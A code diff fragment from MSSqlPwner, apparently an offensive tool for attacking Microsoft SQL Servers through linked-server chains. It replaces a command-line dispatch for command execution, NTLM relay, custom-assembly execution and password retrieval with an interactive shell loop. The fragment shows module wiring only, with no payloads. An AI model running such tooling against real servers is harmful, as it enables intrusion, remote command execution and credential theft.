+    available_modules += ["help", "exit"]
     if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
@@ -726,36 +771,64 @@ if __name__ == '__main__':
         sys.exit(1)
     if not mssql_client.enumerate():
         sys.exit(1)
-    link_server = options.link_server if options.link_server else mssql_client.state['hostname']
-    if options.chain_id:
-        link_server = mssql_client.retrieve_link_server_from_chain_id(options.chain_id)
-    if options.module == "enumerate":
-        mssql_client.disconnect()
-        sys.exit(1)
 
-    elif options.module == 'exec':
-        mssql_client.procedure_chain_builder(mssql_client.execute_procedure,
-                                             [options.command_execution_method, options.command],
-                                             linked_server=link_server)
-    elif options.module == 'ntlm-relay':
-        mssql_client.procedure_chain_builder(mssql_client.execute_procedure,
-                                             [options.relay_method, options.smb_server],
-                                             linked_server=link_server)
+    if options.module == "interactive":
+        chosen_chain_id = options.chain_id
+        chosen_link_server = options.link_server
+        while True:
+            try:
+                parser.usage = argparse.SUPPRESS
+                if chosen_chain_id:
+                    title = mssql_client.get_chain_title()
+                else:
+                    chosen_link_server = chosen_link_server if chosen_link_server else mssql_client.state['local_hostname']
+                    title = mssql_client.get_linked_server_title(chosen_link_server)
 
-    elif options.module == 'custom-asm':
-        asm_filename = "CmdExec-x64.dll" if options.arch == 'x64' else "CmdExec-x86.dll"
-        file_location = os.path.join("playbooks/custom-asm", asm_filename)
-        mssql_client.procedure_chain_builder(mssql_client.execute_custom_assembly_procedure,
-                                             [file_location, options.procedure_name, options.command, "CalcAsm"],
-                                             linked_server=link_server)
+                args_list = input(f"MSSqlPwner#{title}> ").strip()
+                if args_list.split(" ")[0] not in available_modules:
+                    LOG.error(f"Unknown module {args_list.split(' ')[0]}, you can use: {', '.join(available_modules)}")
+                    continue
+                elif args_list == "exit":
+                    break
+                elif args_list == "help":
+                    parser.print_help()
+                    continue
+                arguments = utilities.split_exclude_quotes(f'{" ".join(sys.argv[1:-1]).strip()} {args_list}')
+                args = parser.parse_args(arguments)
+                args.chain_id = chosen_chain_id
+                args.link_server = chosen_link_server
+                if args.module == "enumerate":
+                    mssql_client.enumerate()
+                    continue
+                elif args.module == "set-chain":
+                    chosen_link_server = None
+                    mssql_client.chain_id = args.chain
+                    if not mssql_client.is_valid_chain_id():
+                        LOG.error("Chain id is not valid!")
+                        mssql_client.chain_id = None
+                        continue
+                    chosen_chain_id = args.chain
+                    continue
+                elif args.module == "set-link-server":
+                    chosen_chain_id = None
+                    mssql_client.chain_id = None
+                    if not mssql_client.is_valid_link_server(args.link):
+                        LOG.error("Linked server is not valid!")
+                        continue
+                    chosen_link_server = args.link
+                    continue
 
-    elif options.module == 'direct_query':
-        mssql_client.procedure_chain_builder(mssql_client.direct_query,
-                                             [options.query],
-                                             linked_server=link_server)
+                if args.module == "get-chain-list":
+                    mssql_client.get_chain_list()
+                    continue
 
-    elif options.module == 'retrieve-password':
-        mssql_client.retrieve_password(link_server, options.listen_port, options.adsi_provider)
+                if not modules.execute_module(args, mssql_client):
+                    break
+
+            except KeyboardInterrupt:
+                break
+    else:
+        modules.execute_module(options, mssql_client)
 
     mssql_client.rev2self_cmd()
     mssql_client.disconnect()
